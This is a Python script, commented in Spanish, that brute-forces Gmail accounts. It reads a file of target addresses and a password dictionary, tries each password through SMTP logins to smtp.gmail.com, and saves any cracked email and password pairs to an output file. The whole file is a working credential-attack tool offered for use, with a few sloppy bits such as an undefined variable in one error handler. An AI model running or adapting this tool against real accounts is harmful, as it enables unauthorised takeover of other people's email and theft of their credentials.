#!/usr/bin/env python
# -*- coding: utf-8 -*-
########################################################
# Ataque por fuerza bruta al puerto SMTP puerto-->25   #
# se utiliza la libreria de pyton smtplib y sus        #
# distintos metodos.Se ataca a las cuentas de gamil    #
# se utliza fichero de email de gmail y fichero de     #
# passwords.A pesar de que el proceso pueda encontrar  #
# usuario password correcta, esta indicara error si el #
# usuario no tiene activado el acceso de               #
# aplicaciones poco seguras                            #
# https://myaccount.google.com/security                #
########################################################
#Librerias a importar
import os
import sys
from termcolor import colored
import smtplib
import time
import re

####################################################
# Se borra las pantalla
####################################################
def borrarPantalla():
    if os.name == "posix":
        os.system ("clear")
    elif os.name == "ce" or os.name == "nt" or os.name == "dos":
        os.system ("cls")

####################################################
# Se escribe cabecera del fichero de salida        #
# se abre en modo append y se valida que exista    #
# el directorio donde se va a escribir             #
####################################################
def ValidarFichSal():
    name_dirSalida = os.path.join(os.path.dirname(__file__),'FichSal')

    if not os.path.isdir(name_dirSalida):
        print(colored("[-]No existe el directorio donde escribir el fichero de salida ",'red',attrs=['bold']))
        print(colored("[-]El directorio debe de llamarse FichSal",'red',attrs=['bold']))
        exit()

    else:

        name_file_salida = os.path.join(name_dirSalida,"fich_Salida_Gmail_Encontrados.txt")

        return name_file_salida

####################################################
# Se valida que el email es valido con el          #
# modulo re
####################################################
def validarUser(correoGmail):
    if re.match('^[(a-z0-9\_\-\.)]+@[(a-z0-9\_\-\.)]+\.[(a-z)]{2,15}$',correoGmail.lower()):
	       return True
    else:
	       return False

####################################################
# Se valida que el fichero existe en el directorio #
# y ademas que el fichero no esta vacio            #
####################################################
def validaFichEntUser(fileEntUser):
    name_dirEnt =os.path.join(os.path.dirname(__file__),'FichEnt')
    name_file = os.path.join(name_dirEnt,fileEntUser)

    if not os.path.isfile(name_file):
        print(colored("[-] El fichero diccionario NO EXISTE ,por favor verifique directorio y nombre de fichero",'red',attrs=['bold']))
        exit()
    elif os.stat(name_file).st_size==0:
        print(colored("[-]El fichero: diccionario.txt, de posibles passwords esta vacio, en directorio FichEnt",'red',attrs=['bold']))
        exit()

    return name_file

####################################################
# Se valida que el fichero existe en el directorio #
# y ademas que el fichero no esta vacio            #
####################################################
def validaFichEnt(fileEnt):
    name_dirEnt =os.path.join(os.path.dirname(__file__),'FichEnt')
    name_file = os.path.join(name_dirEnt,fileEnt)

    if not os.path.isfile(name_file):
        print(colored("[-] El fichero diccionario NO EXISTE ,por favor verifique directorio y nombre de fichero",'red',attrs=['bold']))
        exit()
    elif os.stat(name_file).st_size==0:
        print(colored("[-]El fichero: diccionario.txt, de posibles passwords esta vacio, en directorio FichEnt",'red',attrs=['bold']))
        exit()

    return name_file

####################################################
# Se lee el fichero de entrada con cada una de las #
# posibles passwords que puede tener el servicio   #
# SMTP para el usuario que hemos pasado             #
####################################################
def leerFichPasswd(Fich_Ent_Passwd):
    leerFichP=open(Fich_Ent_Passwd,'r',encoding='utf-8-sig').readlines()
    leerFichPFinal=(passwd.strip().rstrip() for passwd in leerFichP)

    return leerFichPFinal

####################################################
# Se lee el fichero de entrada con cada una de las #
# posibles usuarios que puede tener el servicio    #
# SMTP                                              #
####################################################
def leerFichUser(Fich_Ent_User):
    leerFichU=open(Fich_Ent_User,'r',encoding='utf-8-sig').readlines()
    leerFichPFinalUser=(userSMTP.strip().rstrip() for userSMTP in leerFichU)

    return leerFichPFinalUser

######################################################
# Se realiza el ataque por fuerza bruta utilizando   #
# el usuario(email) y las passwords                  #
######################################################
def AtaqueFuerzaBrutaSMTP(Usuariovictima):

    print("                                                                          ")
    print(colored("Para el ataque se usara el diccionario de password por defecto",'green',attrs=['bold']))
    print(colored("Diccionario de passwords: ",'green',attrs=['bold']),colored("FichEnt/diccionario.txt",'blue',attrs=['bold']))
    print("                                                                          ")

    tipoDici=input(colored("Desea cambiar el diccionario?, S o N: ",'green',attrs=['bold']))
    print("                                                                          ")

    if tipoDici.upper()=='S':
        print("                                                                          ")
        print(colored("Por favor indique nuevo diccionario,ejemplo password.txt",'green',attrs=['bold']))
        print(colored("Recuerde que debe de estar en el directorio ",'green',attrs=['bold']),colored("FichEnt",'blue',attrs=['bold']))
        print("                                                                          ")
        fileEnt=input(colored("Indique nombre del nuevo diccionario de passwords a utilizar: ",'green',attrs=['bold']))
    elif tipoDici.upper()=='N':
        fileEnt="diccionario.txt"
    else:
        print(colored("[-] Error opcion no valida",'red',attrs=['bold']))
        exit()

    #validamos fichero y lo leemos
    Fich_Ent_Passwd=validaFichEnt(fileEnt)
    passwdPosibles=leerFichPasswd(Fich_Ent_Passwd)

    try:
        smtpFB=smtplib.SMTP('smtp.gmail.com', 587)

    except smtplib.SMTPServerDisconnected as e :
        print(colored("[-] Error desconexion opcion " + str(e),'red',attrs=['bold']))
    except smtplib.SMTPResponseException as e :
        print(colored("[-] Error respuesta erronea " +  str(e),'red',attrs=['bold']))
    except smtplib.SMTPSenderRefused as es :
        print(colored("[-] Error sender refuse " +  str(e),'red',attrs=['bold']))
    except smtplib.SMTPDataError as e :
        print(colored("[-] Error de datos " +  str(e),'red',attrs=['bold']))
    except smtplib.SMTPConnectError as e:
        print(colored("[-] Error conexion " +  str(e) ,'red',attrs=['bold']))
    except smtplib.SMTPException :
        print(colored("[-] Error exception al acceder al servicio SMTP",'red',attrs=['bold']))
        exit()

    try:
        smtpFB.ehlo()
        smtpFB.starttls()
        #smtpFB.ehlo()
    except smtplib.SMTPException :
        print(colored("[-] Error exception al acceder al servicio SMTP ehlo",'red',attrs=['bold']))
        exit()
    try:
        nomFich=ValidarFichSal()
        fsalGmail=open(nomFich,'a')

        fsalGmail.write("**************************************" + "\n")
        fsalGmail.write("         RESULTADOS SCANEO            " + "\n")
        fsalGmail.write("**************************************" + "\n")
        fsalGmail.write("                                      " + "\n")
        fsalGmail.write("**************************************" + "\n")
        fsalGmail.write("   Email y passwords encontradas      " + "\n")
        fsalGmail.write("**************************************" + "\n")
        fsalGmail.write("                                      " + "\n")

        for passw in passwdPosibles:
            try:
                print("                           ")
                print("usuario : " + Usuariovictima)
                print("password: " + passw)

                smtpFB.login(Usuariovictima, passw)

                print(colored("[+]!!!! Password encontrada ¡¡¡¡ ",'green',attrs=['bold']) , colored(passw,'blue',attrs=['bold']) ,colored( " para usuario ",'green',attrs=['bold']),colored(Usuariovictima,'blue',attrs=['bold']),colored(" conexion a SMTP",'green',attrs=['bold']))

                #Escribimos en el fichero de salida
                fsalGmail.write('Password encontrada: Email: ' + Usuariovictima + ' Password: ' +  passw + "\n")

                time.sleep(3)

            except smtplib.SMTPAuthenticationError as e:
                print(colored("[-]Login Error para la password: " + passw + ' ' + str(e),'red',attrs=['bold']))

            except smtplib.SMTPException as e:
                print(colored("[-]Error inesperado en la respuesta del servidor " + str(e) ,'red',attrs=['bold']))
                exit()

        smtpFB.quit()

    except():
        print(colored("[-]Error de conexion a la ip " +Ipvictima+ " puerto: 25",'red',attrs=['bold']))
        exit()

########################################################
# Se solicita IP de entrada victima                    #
# se solicita usuario de conexion                      #
# el puerto por defecto sera el 21 y la password       #
# los posibles valores del fichero de claves a probar  #
########################################################
def SmtpFb():
    borrarPantalla()
    print(colored("*******************************************",'green',attrs=['bold']))
    print(colored("  ATAQUE FUERZA BRUTA SOBRE PROTOCOLO SMTP  ",'green',attrs=['bold']))
    print(colored("*******************************************",'green',attrs=['bold']))
    print("                                                                          ")
    fichEntUsuarios=validaFichEntUser("userGmail.txt")
    fichUserRead=leerFichUser(fichEntUsuarios)

    for user in fichUserRead:
        userOK=validarUser(user)
        print('--------------------------------------------------')
        print("Correo Electronico: " + user)
        print('--------------------------------------------------')
        if userOK:
            AtaqueFuerzaBrutaSMTP(user)
        else:
            print(colored("[-] Correo de gmail " + user + " no valido",'red',attrs=['bold']))
